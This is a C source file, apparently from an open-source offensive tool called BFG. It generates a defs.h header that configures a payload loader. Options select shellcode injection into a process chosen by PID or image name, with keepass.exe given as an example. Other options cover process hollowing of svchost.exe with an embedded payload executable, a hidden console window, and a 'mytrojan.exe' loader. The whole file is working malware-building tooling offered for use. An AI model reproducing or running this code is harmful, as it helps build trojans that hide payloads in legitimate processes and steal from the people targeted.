/*
Author: Daniel Sauder
License: https://www.gnu.org/licenses/gpl.txt or LICENSE file
Web: https://github.com/govolution/bfg
*/
 
#include <getopt.h>
#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

void print_start();
void print_help();
int print_debug;
int load_from_file;

int main (int argc, char **argv)
{
	print_start();

	print_debug = 0;
	load_from_file = 0;
	char *dvalue = NULL;
	char *evalue = NULL;
	char *fvalue = NULL;
	char *ivalue = NULL;
	char *Ivalue = NULL;
	char *Hvalue = NULL;
	int hflag = 0;
	int Fflag = 0;
	int Xflag = 0;
	int Eflag = 0;
	int Aflag = 0;
	int qflag = 0;
	int Pflag = 0;

	int index;
	int c;

	opterr = 0;

	// compute the options
	while ((c = getopt (argc, argv, "d:e:f:i:H:I:lphFXqP")) != -1)	
	{		
		switch (c)			
		{
			case 'd':
				dvalue = optarg;
				break;
			case 'e':
				evalue = optarg;
				break;
			case 'l':
				load_from_file = 1;
				break;
			case 'f':
				fvalue = optarg;
				break;
			case 'i':
				ivalue = optarg;
				break;
			case 'I':
				Ivalue = optarg;
			    break;
			case 'H':
				Hvalue = optarg;
				break;
			case 'h':
				hflag = 1;
				break;
			case 'F':
				Fflag = 1;
				break;
			case 'X':
				Xflag = 1;
				break;
			case 'q':
				qflag = 1;
				break;
			case 'P':
				Pflag = 1;
				break;
			case 'p':
				print_debug = 1;
				break;
			case '?':
				if (optopt == 'd')
					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
				else if (optopt == 'e')
					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
				else if (optopt == 'f')
					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
				else if (optopt == 'i')
					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
				else if (optopt == 'I')
					fprintf (stderr, "Option -%c requires an argument.\n", optopt);	
				else if (optopt == 'H')
					fprintf (stderr, "Option -%c requires an argument.\n", optopt);	
				else if (isprint (optopt))
					fprintf (stderr, "Unknown option `-%c'.\n", optopt);
				else
					fprintf (stderr, "Unknown option character `\\x%x'.\n", optopt);
				return 1;
			default:
				abort ();
		}
	}

	// print help
	if (hflag)
		print_help();
	else if (load_from_file)
	{
		//write LVALUE to defs.h
		FILE *file_def;
		file_def = fopen ("defs.h","w");

		if (file_def == NULL)
		{
			printf ("Error open defs.h\n");
			return -1;
		}

		fprintf (file_def, "#define LVALUE\n");
		fclose(file_def);
	}
	
	// write shellcode from a given file to defs.h
	else if (fvalue)
	{
		printf ("write shellcode from %s to defs.h\n", fvalue);

		FILE *file_def;
		file_def = fopen ("defs.h","w");

		if (file_def == NULL)
		{
			printf ("Error open defs.h\n");
			return -1;
		}

		fseek (file_def, 0, SEEK_END);

		// read the shellcode file, write to defs.h
		FILE *file_sh = fopen ( fvalue, "r" );

		if ( file_sh != NULL )
		{
			if(Eflag)
				fprintf (file_def, "#define FVALUE \"");
			else
				fprintf (file_def, "#define FVALUE \"\"\n");

			char line [ 5000 ];

			while ( fgets ( line, sizeof line, file_sh ) != NULL )
				fprintf (file_def, "%s", line);           

			if(Eflag)
				fprintf (file_def, "\"\n");
			//fprintf (file_def, "\\n");
			fclose ( file_sh );
		}
		else
			printf ("Error open %s\n", fvalue);

		fclose (file_def);
	}

	//inject
	if(ivalue)
	{
		if (strcmp(ivalue, "shellcode")==0)
		{
			FILE *file_def;
			file_def = fopen ("defs.h","a");
			fprintf (file_def, "#define INJECT_SHELLCODE\n");
			fclose (file_def);
		}
		else
			printf("-i %s unknown option\n");
	}
	
	// Process Hollowing
	if(Hvalue)
	{
		printf("Write executable from %s to defs.h\n", Hvalue);
		
		FILE *file_exe = fopen(Hvalue, "r");
		FILE *file_def = fopen("defs.h", "a");
		
		unsigned char currentByte = 0;
		long currentSize = 0;
	
		// Read data from excutable file and write bytewise into array "payload" in defs.h
		fprintf(file_def, "\n unsigned char payload[] = {");
		
		for(int i = 0;;i++) 
		{
			if ((currentByte = fgetc(file_exe)) == EOF) break;			
			if (i != 0) fprintf(file_def, ",");
			if ((i % 12) == 0) fprintf(file_def, "\n\t");
			fprintf(file_def, "0x%.2X", (unsigned char) currentByte);
			currentSize++;
		}
		
		fprintf(file_def, "};");
		
		// Write payload size in bytes into defs.h
		fprintf(file_def, "\nlong payloadSize = %ld;\n", currentSize);
				
		// Set define
		fprintf(file_def, "\n#define PROCESS_HOLLOWING\n");
		
		// Close file handles
		fclose(file_def);
		fclose(file_exe);
	}

	//Image name
	if(Ivalue)
	{
		FILE *file_def;
		file_def = fopen ("defs.h","a");
		fseek (file_def, 0, SEEK_END);
		fprintf (file_def, "#define IMAGE \"%s\"\n", Ivalue);
		fclose (file_def);
	}

	//write flags to defs.h
	FILE *file_def;
	file_def = fopen ("defs.h","a");
	if (file_def == NULL)
	{
		printf ("Error open defs.h\n");
		return -1;
	}

	//write LVALUE to defs.h
	if(print_debug)
		fprintf (file_def, "#define PRINT_DEBUG\n");

	//write X64 to defs.h
	if(Xflag)
		fprintf (file_def, "#define X64\n");

	if(qflag)
		fprintf (file_def, "#define QUIET\n");

	if(Pflag)
		fprintf (file_def, "#define PID\n");

	fclose(file_def);

} //main

void print_help()
{
	printf("Options:\n");
	printf("-i inject\n");
	printf("\t-i shellcode for injecting shellcode\n");
	//printf("\t-i dll for injecting a dll\n");
	//printf("\t-i exe for injecting an executable\n");	
	printf("-H hollow target process and insert payload executable: pwn.exe svchost.exe\n");
	printf("\t-H mypayload.exe to set payload to inserted into the hollowed process\n");
	printf("-P inject shellcode by PID as argument, call pwn.exe PID\n");
	printf("-I inject shellcode by image name, call for example: pwn.exe keepass.exe\n");	
	printf("-l load and exec shellcode from given file, call is with mytrojan.exe myshellcode.txt\n");
	printf("-f compile and execute shellcode into .exe, needs filename of shellcode file\n");
	printf("-X compile for 64 bit\n");
	printf("-p print debug information\n");
	printf("-q quiet mode (hide console window)\n");
	printf("-h help\n\n");
	printf("Please refer README.md for more information\n");
}

void print_start()
{
//http://patorjk.com/software/taag/#p=display&f=3D-ASCII&t=BFG
char output[] =
" ________  ________ ________     \n"
"|\\   __  \\|\\  _____\\\\   ____\\ \n"   
"\\ \\  \\|\\ /\\ \\  \\__/\\ \\  \\___| \n"   
" \\ \\   __  \\ \\   __\\\\ \\  \\  ___  \n"
"  \\ \\  \\|\\  \\ \\  \\_| \\ \\  \\|\\  \\ \n"
"   \\ \\_______\\ \\__\\   \\ \\_______\\ \n"
"    \\|_______|\\|__|    \\|_______| \n"
		"\n\nBinary Fancy Generator by Daniel Sauder\n"
		"use -h for help\n\n";
	printf("\n%s", output);
}
